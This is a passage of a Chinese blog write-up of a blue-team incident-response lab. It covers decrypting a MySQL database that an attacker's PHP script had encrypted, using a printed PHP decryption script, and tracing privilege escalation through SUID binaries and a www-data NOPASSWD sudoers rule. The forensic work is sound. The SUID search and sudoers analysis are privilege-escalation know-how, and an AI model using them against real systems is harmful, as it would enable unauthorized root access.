+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -newer /var/www/html/plugins/cpg.php ! -newer /var/lib/mysql/JPMorgan@0020Chase/Balance.frm</span><br></pre></td></tr></tbody></table></figure>
+
+<p>简单分析；</p>
+<p>/: 从根目录开始查找。<br>-type f: 只查找文件（不包括目录、链接等）。<br>-newer /var/www/html/plugins/cpg.php: 找出比这个文件新的文件。<br>! -newer /var/lib/mysql/JPMorgan@0020Chase/Balance.frm: 找出比这个文件旧的文件。<br><img src="https://i-blog.csdnimg.cn/direct/7ddf41af7ad245efa897dd4d013e90b3.png#pic_center" alt="在这里插入图片描述"></p>
+<p>跟进分析一下；</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/lib/mysql/clockup.php</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/direct/1adffda297d74b5daaac98a06b91c2f3.png#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>简单来说就是这个PHP脚本的作用是对指定目录下的所有文件进行加密，指定目录那可不就是“/var/lib/mysql/JPMorgan@0020Chase”，那咋办嘞，直接写一个反推的脚本；（这里我丢给gpt写的）</strong></p>
+<p>这里我就直接搬了网上师傅的逆推脚本过来，懒得写了；</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$currentDate = date("Y-m-d");  </span><br><span class="line">$key = md5('2023-11-18');  </span><br><span class="line">$iv = substr(hash('sha256', "DeepMountainsGD"), 0, 16);  </span><br><span class="line">$filePath = "/var/lib/mysql/JPMorgan@0020Chase";  </span><br><span class="line">$files = scandir($filePath);  </span><br><span class="line">foreach ($files as $file) {  </span><br><span class="line">        if ($file != "." &amp;&amp; $file != "..") {  </span><br><span class="line">                    $fullPath = $filePath . '/' . $file;  </span><br><span class="line">                        $encryptedContent = file_get_contents($fullPath);  </span><br><span class="line">                        $decryptedContent = openssl_decrypt($encryptedContent, 'aes-256-cbc', $key, 0, $iv);  </span><br><span class="line">                            file_put_contents($fullPath, $decryptedContent);  </span><br><span class="line">                        }  </span><br><span class="line">}  </span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>那这里我们直接把解密脚本写在/var/www/mysql/目录下即可；（写入的方法不唯一，可以直接在Liunx中“vim”一个文件，也可以直接在Finalsheell下右键新建一个php后缀结尾的文件）</p>
+<p>这里直接是“vim”编辑了一个文件，接着脚本复制进去即可；（注意先按“i”才能复制）</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim 123.php</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/direct/56bdd63629224435b2baca2d1a5b7ff2.png#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>接着保存退出（先按一次Esc，接着按住shift+:英文的冒号，输入：wq保存退出即可）</strong></p>
+<p><strong>接着运行；</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php 123.php</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>运行完成，就先不要急着返回刷新数据库，最好先重启一下数据库；</strong></p>
+<p><strong>使用命令；</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart mysql</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>接着，再返回我们的“Navicat Premium 16”，选中刷新一下即可，看见表；</strong></p>
+<p><img src="https://i-blog.csdnimg.cn/direct/880e54a4d6444fc3a6a19c0fce57ce21.png#pic_center" alt="在这里插入图片描述"></p>
+<h1 id="问题10-因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag-md5-。"><a href="#问题10-因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag-md5-。" class="headerlink" title="问题10:因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag{md5}。"></a>问题10:因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag{md5}。</h1><p><strong>题目让我们找到黑客提权所使用的文件并且进行MD5加密，既然说了提权那我们就可以直接使用命令查找系统中以 root 用户身份拥有并设置了 SUID（Set User ID）权限的文件。</strong></p>
+<p>命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></tbody></table></figure>
+
+<p>简单分析一下；</p>
+<p>find /: 从根目录开始查找文件。<br>-user root: 查找所有属于 root 用户的文件。<br>-perm -4000: 查找设置了 SUID 位的文件（即特殊权限位）。<br>4000 是八进制表示法，用于指定 SUID 位。<br>-perm -4000 意味着查找具有 SUID 权限的文件，无论其他权限如何。<br>2&gt;/dev/null: 将标准错误输出重定向到 /dev/null，即忽略错误信息（例如没有权限访问的目录）。</p>
+<p>简单来说是为了查找被黑客利用的具有 SUID 权限的文件。设置了 SUID 位的文件在执行时将以文件所有者（通常是 root 用户）的权限运行，而不是以执行者的权限运行。黑客可能会利用这些文件进行提权攻击，即通过这些文件获取 root 权限，从而对系统进行更高权限的操作。</p>
+<p><img src="https://i-blog.csdnimg.cn/direct/0ca83b96107341c2acc64757e2546276.png#pic_center" alt="在这里插入图片描述"></p>
+<p>简单分析一下；</p>
+<p>发现/usr/bin/sudo：Sudo 是一个常见的提权工具，肯定会被滥用。</p>
+<p>/usr/bin/sudo：</p>
+<p>使用广泛：Sudo 被广泛用于权限提升，如果配置中有漏洞，黑客可以利用 sudo 提权。<br>历史漏洞：Sudo 曾经存在一些被利用的漏洞，比如 CVE-2019-14287，可以绕过限制。<br>那我们进一步的分析一下“/etc/sudoers”</p>
+<p>为什么会分析“/etc/sudoers”呢？</p>
+<p>权限配置：了解哪些用户或用户组被授予了 sudo 权限。如果配置不当，可能允许普通用户以 root 权限运行命令，从而导致安全问题。<br>命令限制：查看是否有特定用户被允许执行特定的命令，而不需要输入密码。如果这些命令存在漏洞，可能被黑客利用来提权。<br>安全策略：确认是否启用了安全策略，例如 requiretty 选项（要求 sudo 命令只能从终端运行），或 NOPASSWD 选项（允许某些命令无需密码运行）。<br>日志记录：检查 sudoers 文件中是否有日志记录配置，方便追踪 sudo 命令的使用情况。</p>
+<p><strong>简而言之： <code>/etc/sudoers</code> 包含了系统上 sudo 的配置和权限设置。（之前不是分析出sudo可能有问题嘛）</strong></p>
+<p>所以；</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/sudoers</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/direct/d2aa16d8b95d4511b0e720f05220eb2a.png#pic_center" alt="在这里插入图片描述"></p>
+<p>简单分析一下；</p>
+<p>默认设置 (Defaults)：</p>
+<p>env_reset：重置环境变量，确保运行 sudo 命令时环境变量安全。<br>mail_badpass：在用户输入错误密码时发送邮件通知。<br>secure_path：为 sudo 命令设置安全路径，确保运行的命令来自可信路径。<br>用户权限 (User privilege specification)：</p>
+<p>root ALL=(ALL:ALL) ALL：root 用户可以在任何主机上以任何用户身份执行任何命令。<br>www-data ALL=(root) NOPASSWD: /bin/systemctl status apache2.service：www-data 用户可以以 root 身份执行 /bin/systemctl status apache2.service 命令，并且无需输入密码。<br>重点分析</p>
+<p>www-data 用户的权限配置：<br>配置允许 www-data 用户以 root 身份执行特定的 systemctl 命令，而不需要输入密码。虽然这看起来是一个受限的权限配置，但如果 www-data 用户的环境中存在漏洞，黑客可以利用这些漏洞提权。<br>例如，如果 web 应用程序允许上传和执行任意文件，黑客可以上传恶意脚本，利用 systemctl 命令的执行权限来进一步渗透系统。<br>NOPASSWD 选项：</p>
+<p>任何无需密码验证的 sudo 配置都可能带来危害，因为它为潜在的攻击者提供了绕过身份验证的途径。<br>在这个案例中，虽然只允许执行 systemctl status apache2.service，存在某种漏洞，肯定会导致执行其它命令或达到提权的效果。<br>题目让我们提交提权文件完整路径的MD5；</p>
+<p>完整路径：/etc/sudoers</p>
+<p><strong>所以直接在Liunx中MD5加密即可；（这里不再多说）</strong></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">扬祺</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/10/09/blueteam%E7%9A%84%E5%B0%8F%E5%BF%83%E6%80%9D/">http://example.com/2025/10/09/blueteam%E7%9A%84%E5%B0%8F%E5%BF%83%E6%80%9D/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Q1yl</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/bz.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/10/09/Windows%E5%AE%9E%E6%88%98-emlog/" title="Windows实战-emlog"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Windows实战-emlog</div></div><div class="info-2"><div class="info-item-1">一、任务 1：找到黑客植入的 Shell 并获取密码（FLAG：rebeyond）核心目标定位黑客上传的 Web 后门（Shell），读取其连接密码。Web 后门（如冰蝎 Shell）是黑客控制服务器的常用工具，通常需密码验证才能连接。 步骤 1：通过 RDP 连接目标服务器 操作步骤 ：  在本地 PC 打开「远程桌面连接」（快捷键：Win+R，输入mstsc回车）。 输入目标服务器的 IP 地址（如192.168.1.100，靶场会提供）、登录账号（如管理员账号Administrator）和密码，点击 “连接”。   操作理由 ：  RDP（远程桌面协议）是 Windows 系统默认的远程管理工具，只有先连接服务器，才能查看其文件和日志。   原理解析 ：  RDP 通过 TCP 端口 3389 传输数据，允许本地 PC 直接操控服务器桌面，就像操作自己的电脑一样，是运维和溯源的基础入口。    步骤 2：进入 phpstudy 目录，找到 access.log 日志文件 操作步骤 ：  服务器桌面通常有phpstudy图标（或在安装目录，默认路径：D:\phpstudy或C...</div></div></div></a><a class="pagination-related" href="/2025/10/09/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="日志分析-mysql应急响应"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">日志分析-mysql应急响应</div></div><div class="info-2"><div class="info-item-1">目标1：找到攻击者放的后门文件（sh.php）步骤 1：切换到网站目录1cd /var/www/html  步骤 2：打包网站源码（给 D 盾扫描用）1tar -czvf web.tar.gz ./*  tar：压缩工具；-c创建压缩包、-z用 gzip 压缩、-v显示过程、-f指定包名；./：当前目录所有文件打包为web.tar.gz。 在D盾扫出来的文件中寻找flag即可目标2：寻找反弹 Shell 的 IP（攻击者控制服务器的地址）什么是 “反弹 Shell”？正常情况下，是我们主动访问服务器（比如浏览器打开网站）；而 “反弹 Shell” 是服务器主动连接攻击者的电脑，把服务器的命令行权限 “反弹” 给攻击者。这样即使服务器有防火墙，只要能联网，攻击者就能偷偷控制它。 1）查看 MySQL 报错日志：/var/log/mysql/error.log在终端输入 1cat /var/log/mysql/error.log  攻击者可能通过 MySQL 漏洞（比如 SQL 注入）入侵，操作过程中如果出错，会记录在 MySQL 的报错日志里。这里日志里恰好记录了攻击者执行的/tm...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/bz.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info-name">扬祺</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">V:lyq3035762968</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-1%EF%BC%9A%E6%89%BE%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%E5%B9%B6%E7%AE%97-MD5"><span class="toc-number">1.</span> <span class="toc-text">问题 1：找登录密码并算 MD5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%EF%BC%9A%E4%BB%8E%E6%B5%81%E9%87%8F%E5%8C%85%E4%B8%AD%E6%8C%96%E5%87%BA%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%EF%BC%8C%E5%86%8D%E7%AE%97%E5%AE%83%E7%9A%84-MD5-%E5%80%BC"><span class="toc-number">1.1.</span> <span class="toc-text">目标：从流量包中挖出登录密码，再算它的 MD5 值</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-1%EF%BC%9A%E7%94%A8%E7%BB%88%E7%AB%AF%E6%89%BE%E6%B5%81%E9%87%8F%E5%8C%85%EF%BC%88PCAP-%E6%96%87%E4%BB%B6%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">步骤 1：用终端找流量包（PCAP 文件）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-2%EF%BC%9A%E7%94%A8-Wireshark-%E6%89%93%E5%BC%80%E6%B5%81%E9%87%8F%E5%8C%85%E6%89%BE%E5%AF%86%E7%A0%81"><span class="toc-number">1.1.2.</span> <span class="toc-text">步骤 2：用 Wireshark 打开流量包找密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-3%EF%BC%9A%E7%AE%97%E5%AF%86%E7%A0%81%E7%9A%84-MD5-%E5%80%BC"><span class="toc-number">1.1.3.</span> <span class="toc-text">步骤 3：算密码的 MD5 值</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-2%EF%BC%9A%E6%89%BE%E4%B8%8A%E4%BC%A0%E5%90%8E%E9%97%A8%E7%9A%84-PHP-%E9%A1%B5%E9%9D%A2"><span class="toc-number">2.</span> <span class="toc-text">问题 2：找上传后门的 PHP 页面</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%EF%BC%9A%E4%BB%8E%E6%B5%81%E9%87%8F%E5%8C%85%E4%B8%AD%E6%89%BE%E5%88%B0-%E2%80%9C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%9D-%E5%AF%B9%E5%BA%94%E7%9A%84-PHP-%E9%A1%B5%E9%9D%A2%EF%BC%88%E6%AF%94%E5%A6%82-upload-php%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">目标：从流量包中找到 “文件上传” 对应的 PHP 页面（比如 upload.php）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-1%EF%BC%9A%E5%9C%A8-Wireshark-%E4%B8%AD%E7%AD%9B%E9%80%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F"><span class="toc-number">2.1.1.</span> <span class="toc-text">步骤 1：在 Wireshark 中筛选文件上传流量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-2%EF%BC%9A%E7%AE%97%E9%A1%B5%E9%9D%A2%E5%90%8D%E7%A7%B0%E7%9A%84-MD5-%E5%80%BC"><span class="toc-number">2.1.2.</span> <span class="toc-text">步骤 2：算页面名称的 MD5 值</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%97%AE%E9%A2%98-3%EF%BC%9A%E6%89%BE%E4%B8%8A%E4%BC%A0%E7%9A%84-WebShell-%E6%96%87%E4%BB%B6%E5%B9%B6%E7%AE%97-MD5"><span class="toc-number">3.</span> <span class="toc-text">问题 3：找上传的 WebShell 文件并算 MD5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%EF%BC%9A%E6%89%BE%E5%88%B0%E6%94%BB%E5%87%BB%E8%80%85%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%81%B6%E6%84%8F-PHP-%E6%96%87%E4%BB%B6%EF%BC%88%E6%AF%94%E5%A6%82-webshell-php%EF%BC%89%EF%BC%8C%E5%86%8D%E7%AE%97%E5%AE%83%E7%9A%84-MD5"><span class="toc-number">3.1.</span> <span class="toc-text">目标：找到攻击者上传的恶意 PHP 文件（比如 webshell.php），再算它的 MD5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-1%EF%BC%9A%E4%BB%8E%E6%B5%81%E9%87%8F%E5%8C%85%E6%89%BE-WebShell-%E7%9A%84%E4%BF%9D%E5%AD%98%E8%B7%AF%E5%BE%84"><span class="toc-number">3.1.1.</span> <span class="toc-text">步骤 1：从流量包找 WebShell 的保存路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-2%EF%BC%9A%E5%9C%A8%E7%BB%88%E7%AB%AF%E9%AA%8C%E8%AF%81%E6%96%87%E4%BB%B6%E5%B9%B6%E7%AE%97-MD5"><span class="toc-number">3.1.2.</span> <span class="toc-text">步骤 2：在终端验证文件并算 MD5</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%97%AE%E9%A2%984-%E6%94%BB%E5%87%BB%E8%80%85%E5%90%8E%E7%BB%AD%E5%8F%88%E4%B8%8B%E8%BD%BD%E4%BA%86%E4%B8%80%E4%B8%AA%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%9A%84%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%EF%BC%8C%E6%8F%90%E4%BA%A4%E8%AF%A5%E6%96%87%E4%BB%B6%E7%9A%84%E5%B0%8F%E5%86%99md5%E5%80%BC%EF%BC%8C%E6%A0%BC%E5%BC%8Fflag-md5-%E3%80%82"><span class="toc-number">4.</span> <span class="toc-text">问题4:攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag{md5}。</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%97%AE%E9%A2%985-%E6%94%BB%E5%87%BB%E8%80%85%E5%88%9B%E5%BB%BA%E4%BA%86%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E7%9A%84%E5%90%8D%E7%A7%B0%E6%98%AF%EF%BC%9F%E4%BE%8B%E5%A6%82attack%E6%81%B6%E6%84%8F%E7%94%A8%E6%88%B7%EF%BC%8C%E4%B8%8A%E4%BC%A0%E5%AD%97%E7%AC%A6%E4%B8%B2%E2%80%9Dattack%E2%80%9D%E7%9A%84%E5%B0%8F%E5%86%99md5%E5%80%BC%EF%BC%8C%E6%A0%BC%E5%BC%8Fflag-md5-%E3%80%82"><span class="toc-number">5.</span> <span class="toc-text">问题5:攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串”attack”的小写md5值，格式flag{md5}。</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%97%AE%E9%A2%986-%E6%94%BB%E5%87%BB%E8%80%85%E5%88%9B%E5%BB%BA%E4%BA%86%E4%B8%80%E4%B8%AA%E6%8C%81%E4%B9%85%E5%8C%96%E7%9A%84%E9%85%8D%E7%BD%AE%E9%A1%B9%EF%BC%8C%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%B0%B1%E4%BC%9A%E8%A7%A6%E5%8F%91%E5%90%8E%E9%97%A8%E7%9A%84%E8%BF%9E%E6%8E%A5%E3%80%82%E6%8F%90%E4%BA%A4%E8%AF%A5%E9%85%8D%E7%BD%AE%E9%A1%B9%E5%AF%B9%E5%BA%94%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E5%B0%8F%E5%86%99md5%E5%80%BC%EF%BC%8C%E6%A0%BC%E5%BC%8Fflag-md5-%E3%80%82"><span class="toc-number">6.</span> <span class="toc-text">问题6:攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%97%AE%E9%A2%987-%E6%94%BB%E5%87%BB%E8%80%85%E5%88%9B%E5%BB%BA%E4%BA%86%E4%B8%80%E4%B8%AA%E6%8C%81%E4%B9%85%E5%8C%96%E7%9A%84%E9%85%8D%E7%BD%AE%E9%A1%B9%EF%BC%8C%E5%AF%BC%E8%87%B4%E5%8F%AA%E6%9C%89root%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%89%8D%E4%BC%9A%E8%A7%A6%E5%8F%91%E5%90%8E%E9%97%A8%E7%9A%84%E8%BF%9E%E6%8E%A5%E3%80%82%E6%8F%90%E4%BA%A4%E8%AF%A5%E9%85%8D%E7%BD%AE%E9%A1%B9%E5%AF%B9%E5%BA%94%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E5%B0%8F%E5%86%99md5%E5%80%BC%EF%BC%8C%E6%A0%BC%E5%BC%8Fflag-md5-%E3%80%82"><span class="toc-number">7.</span> <span class="toc-text">问题7:攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%97%AE%E9%A2%988-%E6%94%BB%E5%87%BB%E8%80%85%E5%8A%A0%E5%AF%86%E4%BA%86%E5%93%AA%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9F%E6%8F%90%E4%BA%A4%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B9%E5%90%8D%EF%BC%8C%E4%BE%8B%E5%A6%82user%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%B9%E5%BA%94%E5%AD%98%E6%94%BE%E4%BD%8D%E7%BD%AE%E4%B8%BAuser%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%8C%E4%B8%8A%E4%BC%A0%E5%AD%97%E7%AC%A6%E4%B8%B2%E2%80%9Duser%E2%80%9D%E7%9A%84%E5%B0%8F%E5%86%99md5%E5%80%BC%EF%BC%8C%E6%A0%BC%E5%BC%8Fflag-md5-%E3%80%82"><span class="toc-number">8.</span> <span class="toc-text">问题8:攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串”user”的小写md5值，格式flag{md5}。</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%97%AE%E9%A2%989-%E8%A7%A3%E5%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%8C%E6%8F%90%E4%BA%A4Harper%E7%94%A8%E6%88%B7%E5%AF%B9%E5%BA%94Areer%E7%9A%84%E5%80%BC%E3%80%82%E6%8F%90%E4%BA%A4Areer%E5%80%BC%E7%9A%84%E5%B0%8F%E5%86%99md5%E5%80%BC%EF%BC%8C%E6%A0%BC%E5%BC%8Fflag-md5-%E3%80%82"><span class="toc-number">9.</span> <span class="toc-text">问题9:解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag{md5}。</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%97%AE%E9%A2%9810-%E5%9B%A0%E4%B8%BA%E4%BB%80%E4%B9%88%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E9%85%8D%E7%BD%AE%EF%BC%8C%E5%AF%BC%E8%87%B4%E4%BA%86%E6%94%BB%E5%87%BB%E8%80%85%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%B9%B6%E6%8F%90%E6%9D%83%E3%80%82%E6%8F%90%E4%BA%A4%E8%AF%A5%E6%96%87%E4%BB%B6%E7%9A%84%E5%B0%8F%E5%86%99md5%E5%80%BC%EF%BC%8C%E6%A0%BC%E5%BC%8Fflag-md5-%E3%80%82"><span class="toc-number">10.</span> <span class="toc-text">问题10:因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag{md5}。</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/09/Windows%E5%AE%9E%E6%88%98-emlog/" title="Windows实战-emlog">Windows实战-emlog</a><time datetime="2025-10-09T10:50:41.000Z" title="发表于 2025-10-09 18:50:41">2025-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/09/blueteam%E7%9A%84%E5%B0%8F%E5%BF%83%E6%80%9D/" title="blueteam的小心思">blueteam的小心思</a><time datetime="2025-10-09T10:49:49.000Z" title="发表于 2025-10-09 18:49:49">2025-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/09/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="日志分析-mysql应急响应">日志分析-mysql应急响应</a><time datetime="2025-10-09T10:49:17.000Z" title="发表于 2025-10-09 18:49:17">2025-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/09/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache/" title="日志分析-apache">日志分析-apache</a><time datetime="2025-10-09T10:48:52.000Z" title="发表于 2025-10-09 18:48:52">2025-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/09/Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%90%8E%E9%97%A8/" title="Linux权限维持-后门">Linux权限维持-后门</a><time datetime="2025-10-09T10:48:24.000Z" title="发表于 2025-10-09 18:48:24">2025-10-09</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">©&nbsp;2025 By 扬祺</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
